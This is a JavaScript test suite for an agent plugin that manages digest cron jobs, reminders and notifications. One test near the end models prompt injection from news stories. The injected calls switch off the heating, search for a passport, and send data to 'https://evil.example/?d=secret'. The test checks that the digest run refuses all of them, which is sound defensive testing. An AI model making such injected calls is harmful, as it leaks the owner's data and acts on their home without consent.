import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createTaskHooks, cronJobOfSession, DIGEST_DESCRIPTION, REMINDER_HINT, REMINDER_MARK, reminderHint, reminderJob } from '../plugin/integration-tasks.mjs';
import { createIntegrationTools } from '../plugin/integrations.mjs';

function recorder(replies) {
  const sent = [];
  const submit = async payload => {
    sent.push(payload);
    const reply = typeof replies === 'function' ? replies(payload) : replies[payload.action];
    if (reply instanceof Error) throw reply;
    return reply;
  };
  return {sent, submit};
}

test('finished runs of Portal tasks reach the service; other events do not', async () => {
  const {sent, submit} = recorder({'task-finished': {ok: true, notified: true}});
  const warnings = [];
  const hooks = createTaskHooks({submit, warn: message => warnings.push(message)});
  await hooks.cronChanged({action: 'started', jobId: 'j1'});
  await hooks.cronChanged({action: 'finished', jobId: 'j2', agentId: 'other', status: 'ok'});
  await hooks.cronChanged({action: 'finished', jobId: 'j3', agentId: 'pixel', status: 'error', error: 'Disk full',
    summary: 'x'.repeat(5000), runAtMs: 42, job: {name: 'Backup', description: 'Nightly'}});
  await hooks.cronChanged({action: 'finished', jobId: 'j4', status: 'ok', job: {}});
  assert.deepEqual(sent.map(item => [item.jobId, item.name, item.description, item.status, item.runAtMs, item.summary.length]),
    [['j3', 'Backup', 'Nightly', 'error', 42, 4000], ['j4', '', '', 'ok', 0, 0]]);
  assert.deepEqual(warnings, []);
  const failing = createTaskHooks({submit: async () => { throw new Error('down'); }, warn: message => warnings.push(message)});
  await failing.cronChanged({action: 'finished', jobId: 'j5', status: 'ok'});
  const refusing = createTaskHooks({submit: async () => ({ok: false, message: 'notifications off'}), warn: message => warnings.push(message)});
  await refusing.cronChanged({action: 'finished', jobId: 'j6', status: 'ok'});
  assert.deepEqual(warnings, ['Portal integrations: scheduled task notice failed: down',
    'Portal integrations: scheduled task notice failed: notifications off']);
});

function fakeCron(jobs = []) {
  const calls = [];
  return {
    calls, jobs,
    list: async options => { calls.push(['list', options]); return jobs; },
    add: async job => { calls.push(['add', job]); jobs.push({id: `j${jobs.length + 1}`, ...job}); return jobs.at(-1); },
    update: async (id, patch) => { calls.push(['update', id, patch]); },
    remove: async id => { calls.push(['remove', id]); return {removed: true}; },
  };
}

const PLAN = {enabled: true, name: 'Daily news digest', description: 'Created by Portal integrations for the daily news digest.',
  expr: '30 6 * * *', tz: 'Europe/Lisbon', message: 'Read the news digest.', timeoutSeconds: 600,
  tools: ['pixel_ods_mcp']};

test('the digest job is added, kept, updated and removed to follow the settings', async () => {
  let plan = PLAN;
  const {submit} = recorder(() => ({ok: true, plan}));
  const cron = fakeCron([{id: 'other', description: 'Someone else', schedule: {kind: 'cron', expr: '0 9 * * *'}}]);
  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval: () => {}}});
  assert.equal(await hooks.syncDigest(), 'no-cron');
  await hooks.gatewayStart({}, {getCron: () => cron});
  assert.deepEqual(cron.calls.at(-1), ['add', {name: PLAN.name, description: PLAN.description, enabled: true, agentId: 'pixel',
    schedule: {kind: 'cron', expr: '30 6 * * *', tz: 'Europe/Lisbon'}, sessionTarget: 'isolated', wakeMode: 'now',
    payload: {kind: 'agentTurn', message: PLAN.message, timeoutSeconds: 600, lightContext: true, toolsAllow: ['pixel_ods_mcp']},
    delivery: {mode: 'none'}, deleteAfterRun: false}]);
  assert.equal(await hooks.syncDigest(), 'kept');
  plan = {...PLAN, expr: '0 7 * * *'};
  assert.equal(await hooks.syncDigest(), 'updated');
  assert.deepEqual(cron.calls.at(-1)[2].schedule, {kind: 'cron', expr: '0 7 * * *', tz: 'Europe/Lisbon'});
  assert.equal('name' in cron.calls.at(-1)[2], false);
  cron.jobs.push({id: 'dupe', description: PLAN.description, schedule: {kind: 'cron', expr: '0 7 * * *', tz: 'Europe/Lisbon'}, payload: {message: PLAN.message, timeoutSeconds: 600, toolsAllow: ['pixel_ods_mcp']}});
  cron.jobs[1].schedule.expr = '0 7 * * *';
  assert.equal(await hooks.syncDigest(), 'kept');
  assert.deepEqual(cron.calls.at(-1), ['remove', 'dupe']);
  plan = {...PLAN, enabled: false};
  assert.equal(await hooks.syncDigest(), 'removed');
  assert.equal(cron.calls.filter(([kind, id]) => kind === 'remove' && id === 'other').length, 0);
});

test('the digest sync runs at gateway start and every minute, and stops with the gateway', async () => {
  const timers = {started: [], cleared: [], setInterval(fn, ms) { this.started.push([fn, ms]); return {unref() {}}; },
    clearInterval(handle) { this.cleared.push(handle); }};
  const warnings = [];
  const hooks = createTaskHooks({submit: async () => ({ok: false, message: 'service down'}), timers, warn: message => warnings.push(message)});
  await hooks.gatewayStart({}, {getCron: () => fakeCron()});
  await hooks.gatewayStart({}, {getCron: () => fakeCron()});
  assert.equal(timers.started.length, 1);
  assert.equal(timers.started[0][1], 60000);
  await timers.started[0][0]();
  assert.deepEqual(warnings, Array(3).fill('Portal integrations: daily digest not scheduled: service down'));
  hooks.gatewayStop();
  assert.equal(timers.cleared.length, 1);
});

test('overlapping digest syncs add the job only once', async () => {
  let release;
  const gate = new Promise(resolve => { release = resolve; });
  const cron = fakeCron();
  const slowList = cron.list;
  cron.list = async options => { await gate; return slowList(options); };
  const hooks = createTaskHooks({submit: async () => ({ok: true, plan: PLAN})});
  await hooks.cronChanged({action: 'added', jobId: 'x'}, {getCron: () => cron});
  const first = hooks.syncDigest();
  const second = hooks.syncDigest();  // The minute timer fires while the start-up sync still waits.
  release();
  assert.deepEqual(await Promise.all([first, second]), ['added', 'added']);
  assert.equal(cron.calls.filter(([kind]) => kind === 'add').length, 1);
  assert.equal(await hooks.syncDigest(), 'kept');  // A later sync runs on its own again.
});

const REMINDER_PLAN = {name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs', atMs: Date.UTC(2026, 10, 3, 16, 22),
  when: 'Tue 03 Nov 2026 at 16:22 WET', text: 'Stretch your legs', runMessage: 'Reply with exactly: Done.'};

test('a reminder becomes a one-off job that deletes itself and runs nothing of note', () => {
  assert.deepEqual(reminderJob(REMINDER_PLAN, 'pixel'), {
    name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs', enabled: true, agentId: 'pixel',
    schedule: {kind: 'at', at: '2026-11-03T16:22:00.000Z'}, sessionTarget: 'isolated', wakeMode: 'now',
    payload: {kind: 'agentTurn', message: 'Reply with exactly: Done.', timeoutSeconds: 60, lightContext: true, toolsAllow: []},
    delivery: {mode: 'none'}, deleteAfterRun: true});
  assert.ok(REMINDER_PLAN.description.startsWith(REMINDER_MARK));
});

test('reminders are scheduled with the gateway cron once it is known', async () => {
  const {submit} = recorder({'digest-plan': {ok: true, plan: {...PLAN, enabled: false}}});
  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval() {}}, shared: {}});
  await assert.rejects(hooks.scheduleReminder(REMINDER_PLAN), /scheduler is not ready/);
  const cron = fakeCron();
  await hooks.gatewayStart({}, {getCron: () => cron});
  await hooks.scheduleReminder(REMINDER_PLAN);
  assert.deepEqual(cron.calls.filter(([kind]) => kind === 'add').map(([, job]) => [job.name, job.schedule.kind, job.deleteAfterRun]),
    [['Reminder: Stretch', 'at', true]]);
});

test('a reminder is sent when its job starts, and its run is removed when it ends', async () => {
  const {sent, submit} = recorder({'reminder-due': {ok: true, notified: true}, 'task-finished': {ok: true, notified: false}});
  const warnings = [];
  const cron = fakeCron();
  const hooks = createTaskHooks({submit, warn: message => warnings.push(message)});
  const job = {name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs'};
  await hooks.cronChanged({action: 'added', jobId: 'r1', agentId: 'pixel', job}, {getCron: () => cron});
  await hooks.cronChanged({action: 'started', jobId: 'r1', agentId: 'pixel', job, runAtMs: 5}, {getCron: () => cron});
  await hooks.cronChanged({action: 'finished', jobId: 'r1', agentId: 'pixel', job, status: 'error', error: 'model busy'}, {getCron: () => cron});
  // Another agent's job is not Portal's, even when its description looks like a reminder.
  await hooks.cronChanged({action: 'started', jobId: 'x1', agentId: 'other', job}, {getCron: () => cron});
  assert.deepEqual(sent, [{action: 'reminder-due', jobId: 'r1', name: 'Reminder: Stretch', description: 'Portal reminder: Stretch your legs'}]);
  assert.deepEqual(cron.calls, [['remove', 'r1']]);
  assert.deepEqual(warnings, []);
});

test('a reminder that cannot be sent is a warning, not a crash', async () => {
  const warnings = [];
  const job = {name: 'Reminder: Tea', description: 'Portal reminder: Tea'};
  const refusing = createTaskHooks({submit: async () => ({ok: false, message: 'notifications off'}), warn: message => warnings.push(message)});
  await refusing.cronChanged({action: 'started', jobId: 'r2', job});
  const down = createTaskHooks({submit: async () => { throw new Error('down'); }, warn: message => warnings.push(message)});
  await down.cronChanged({action: 'started', jobId: 'r3', job});
  assert.deepEqual(warnings, ['Portal integrations: reminder not sent: notifications off', 'Portal integrations: reminder failed: down']);
});

test('a scheduler that appears after gateway start is still found for a reminder', async () => {
  const {submit} = recorder({'digest-plan': {ok: true, plan: {...PLAN, enabled: false}}});
  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval() {}}});
  let cron;
  // At gateway start OpenClaw has not created its cron service yet.
  await hooks.gatewayStart({}, {getCron: () => cron});
  cron = fakeCron();
  await hooks.scheduleReminder(REMINDER_PLAN);
  assert.equal(cron.calls.filter(([kind]) => kind === 'add').length, 1);
});

test('a reminder set from another instance of the plugin finds the scheduler the gateway gave the first', async () => {
  const shared = {};
  const {submit} = recorder({'digest-plan': {ok: true, plan: {...PLAN, enabled: false}}});
  const timers = {setInterval: () => ({}), clearInterval() {}};
  const hooked = createTaskHooks({submit, timers, shared});
  const tools = createTaskHooks({submit, timers, shared});
  await assert.rejects(tools.scheduleReminder(REMINDER_PLAN), /scheduler is not ready/);
  const cron = fakeCron();
  await hooked.gatewayStart({}, {getCron: () => cron});
  await tools.scheduleReminder(REMINDER_PLAN);
  assert.equal(cron.calls.filter(([kind]) => kind === 'add').length, 1);
  // Separate processes, or tests, keep separate slots.
  await assert.rejects(createTaskHooks({submit, timers, shared: {}}).scheduleReminder(REMINDER_PLAN), /not ready/);
});

test('a turn asking for a reminder is told which tool sets one', () => {
  for (const text of ['Set a reminder for 17:30', 'reminders for tomorrow please', 'remind me at 5pm'])
    assert.equal(reminderHint(text), REMINDER_HINT, text);
  for (const text of ['What is the weather?', 'The reminiscence was nice', 'in 5 minutes, check the build', undefined])
    assert.equal(reminderHint(text), '', String(text));
  // Asking Portal to recall something is no reminder.
  for (const text of ['Can you remind me what my lease deposit was?', 'Remind me who Ana is', 'remind me how the boiler resets', 'Remind me of my sister\'s address'])
    assert.equal(reminderHint(text), '', text);
  // Unless it says when: then it is a reminder after all.
  for (const text of ['Remind me what to buy at 18:00', 'remind me of the dentist tomorrow', 'Remind me what to pack in 30 minutes'])
    assert.notEqual(reminderHint(text), '', text);
  assert.equal(JSON.parse(reminderHint('Remind me what to pack in 30 minutes').match(/args (\{.*?\})\./)[1]).inMinutes, 30);
  assert.match(REMINDER_HINT, /tool_call with id "openclaw:pixel-ods:pixel_ods_notify"/, 'the hint gives the exact call');
  // No number the model could copy: the general hint has placeholders only.
  assert.doesNotMatch(REMINDER_HINT, /"inMinutes": \d|"at": "\d/);
});

test('a reminder hint uses the delay the owner asked for, so the model never copies another number', () => {
  const minutes = text => JSON.parse(reminderHint(text).match(/args (\{.*?\})\./)[1]).inMinutes;
  assert.equal(minutes('Remind me in 3 minutes to drink some water.'), 3);
  assert.equal(minutes('remind me in 1 min'), 1);
  assert.equal(minutes('Remind me in 2 hours to call Ana'), 120);
  assert.equal(minutes('remind me in 1h'), 60);
  assert.equal(minutes('Lembre-me daqui a 10 minutos'), 10);
  assert.equal(minutes('Me lembre em 2 horas'), 120);
  assert.equal(minutes('Lembra-me daqui a 10 minutos de beber água'), 10);
  // Every part of a delay counts: the model copies the number as is.
  assert.equal(minutes('Remind me in 1 hour 30 minutes to leave'), 90);
  assert.equal(minutes('remind me in 1h 30m'), 90);
  assert.equal(minutes('remind me in 2 hours and 15 minutes'), 135);
  assert.equal(minutes('Lembra-me daqui a 1 hora e 30 minutos'), 90);
  assert.equal(minutes('Remind me in 10 minutes to call 2 people'), 10, 'a later number that is no delay is not added');
  assert.match(reminderHint('Remind me in 3 minutes'), /tool_call with id "openclaw:pixel-ods:pixel_ods_notify"/);
});

test('the digest description is the service\'s own', () => {
  const service = fs.readFileSync(new URL('../host/integrations_apps.py', import.meta.url), 'utf8');
  assert.ok(service.includes(`DIGEST_MARKER = "${DIGEST_DESCRIPTION}"`));
  assert.equal(cronJobOfSession('agent:pixel:cron:4F2a-9c'), '4f2a-9c');
  assert.equal(cronJobOfSession('agent:pixel:cron:job-1:run:1793816393'), 'job-1');
  for (const other of ['agent:pixel:openai-user:ods-' + 'a'.repeat(64), 'agent:pixel:main', '', undefined]) assert.equal(cronJobOfSession(other), '');
});

test('a digest run is known from the sync, its start, or the scheduler; chats and other tasks are not digest runs', async () => {
  const {submit} = recorder(() => ({ok: true, plan: PLAN}));
  const cron = fakeCron([{id: 'Nightly-Backup', description: 'Back up the photos'}]);
  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval: () => {}}, shared: {}});
  await hooks.gatewayStart({}, {getCron: () => cron});
  const digestId = cron.jobs.find(job => job.description === DIGEST_DESCRIPTION).id;
  assert.equal(await hooks.isDigestRun(`agent:pixel:cron:${digestId}`), true);
  assert.equal(await hooks.isDigestRun('agent:pixel:cron:nightly-backup'), false);
  assert.equal(await hooks.isDigestRun('agent:pixel:openai-user:ods-' + 'a'.repeat(64)), false);
  assert.equal(await hooks.isDigestRun('agent:pixel:cron:vanished'), true, 'a run nobody can name may only read the digest');
  // Seen when it starts, before its run calls a tool.
  const started = createTaskHooks({submit, shared: {}});
  await started.cronChanged({action: 'started', jobId: 'D9', agentId: 'pixel', job: {description: DIGEST_DESCRIPTION}});
  assert.equal(await started.isDigestRun('agent:pixel:cron:d9'), true);
  // Asked of the scheduler when the hooks never saw it.
  const fresh = createTaskHooks({submit, shared: {}});
  await fresh.gatewayStart({}, {getCron: () => fakeCron([{id: 'late', description: DIGEST_DESCRIPTION}])});
  assert.equal(await fresh.isDigestRun('agent:pixel:cron:late'), true);
});

test('in the digest run, the app tool reads the digest and nothing else', async () => {
  const sent = [];
  const submit = async payload => { sent.push(payload); return {ok: true, text: 'Stories', isError: false, servers: []}; };
  const mcp = isDigestRun => createIntegrationTools({submit, sessionKey: 'agent:pixel:cron:d1', isDigestRun}).find(tool => tool.name === 'pixel_ods_mcp');
  const digest = mcp(async () => true);
  // A story that says "turn the heating off" or "watch this page" gets nowhere.
  for (const params of [{action: 'list'}, {action: 'call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}},
    {action: 'call', server: 'watch', tool: 'add', arguments: {url: 'https://evil.example/?d=secret'}},
    {action: 'call', server: 'documents', tool: 'search', arguments: {query: 'passport'}}]) {
    const refused = await digest.execute('1', params);
    assert.equal(refused.isError, true, JSON.stringify(params));
    assert.match(refused.content[0].text, /may only read the digest/);
  }
  assert.deepEqual(sent, []);
  const read = await digest.execute('2', {action: 'call', server: 'news', tool: 'digest', arguments: {limit: 9999, extra: 'x'}});
  assert.equal(read.content[0].text, 'Stories');
  assert.deepEqual(sent, [{action: 'mcp-call', server: 'news', tool: 'digest', arguments: {}}]);
  // Anywhere else the tool works as before.
  await mcp(async () => false).execute('3', {action: 'call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}});
  assert.deepEqual(sent.at(-1), {action: 'mcp-call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}});
});

test('a notification with empty reminder fields is sent now, not refused as a reminder', async () => {
  const sent = [];
  const notify = createIntegrationTools({submit: async payload => { sent.push(payload); return {ok: true}; }}).find(tool => tool.name === 'pixel_ods_notify');
  for (const params of [{message: 'Build done', inMinutes: null, at: null}, {message: 'Build done', at: ''}]) {
    const reply = await notify.execute('1', params);
    assert.equal(reply.content[0].text, 'Notification sent.');
  }
  assert.deepEqual(sent.map(item => item.action), ['notify', 'notify']);
});
